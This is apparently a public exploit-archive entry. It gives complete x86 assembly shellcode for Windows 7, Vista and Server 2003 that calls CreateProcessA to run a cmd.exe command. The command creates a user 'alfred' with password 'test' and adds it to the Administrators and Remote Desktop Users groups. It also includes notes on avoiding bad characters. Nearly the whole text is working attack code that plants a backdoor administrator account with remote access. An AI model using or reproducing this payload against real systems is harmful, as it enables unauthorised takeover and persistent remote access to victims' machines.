# Exploit Title: Windows/x86 - Add User Alfred to Administrators/Remote Desktop Users Group Shellcode (240 bytes)
# Exploit Author: Armando Huesca Prida
# Date: 20-02-2021
#
# Tested on:
# Windows 7 Professional 6.1.7601 SP1 Build 7601 (x86)
# Windows Vista Ultimate 6.0.6002 SP2 Build 6002 (x86)
# Windows Server 2003 Enterprise Edition 5.2.3790 SP1 Build 3790 (x86)
#
# Description:
# Windows x86 Shellcode that uses CreateProcessA Windows API to add a new user to administrators and remote desktop users group. This shellcode uses JMP/CALL/POP technique and static kernel32.dll functions addresses.
# It's possible to bypass bad-chars by switching the message db string between uppercase and lowercase letters.
#
# Shellcode considerations:
# Function address of CreateProcessA in kernel32.dll: 0x77082082
# Function address of ExitProcess in kernel32.dll: 0x770d214f
# Administartor user credentials: alfred:test
# Size of message db parameter, 152 bytes -> 0x98 hex =3D 0x111111A9 - 0x11111111 (0x00 badchar avoidance) ;)
#


# Assembly shellcode:

global _start

section .text

_start:
jmp application

firststep:
pop edi
xor eax, eax
mov esi, 0x111111A9
sub esi, 0x11111111
mov [edi+esi], al   ; size of message db parameter

StartUpInfoANDProcessInformation:
push eax; hStderror null in this case
push eax; hStdOutput, null
push eax; hStdInput, null
xor ebx, ebx
xor ecx, ecx
add cl, 0x12; 18 times loop to fill both structures.

looper:
push ebx
loop looper

;mov word [esp+0x3c], 0x0101; dwflag arg in startupinfo
mov bx, 0x1111
sub bx, 0x1010
mov word [esp+0x3c], bx
mov byte [esp+0x10], 0x44; cb=3D0x44
lea eax, [esp+0x10]; eax points to StartUpInfo

; eax holds a pointer to StartUPinfo
; esp holds a pointer to Process_Info filled of null values

createprocessA:
push esp; pointer to Process-Info
push eax; pointer to StartUpInfo
xor ebx, ebx
push ebx; null
push ebx; null
push ebx; null
inc ebx
push ebx; bInheritHandles=3Dtrue
dec ebx
push ebx; null
push ebx; null
push edi; pointer to message db string
push ebx; null
mov edx, 0x77082082; CreateProcessA addr in kernel32.dll
call edx

ExitProcess:
push eax; createprocessA return in eax
mov edx, 0x770d214f; ExitProcess addr in kernel32.dll
call edx

application:
call firststep
message db 'c:\windows\system32\cmd.exe /c net user alfred test /add & net localgroup ADMINISTRATORS alfred /add & net localgroup "Remote Desktop Users" alfred /add'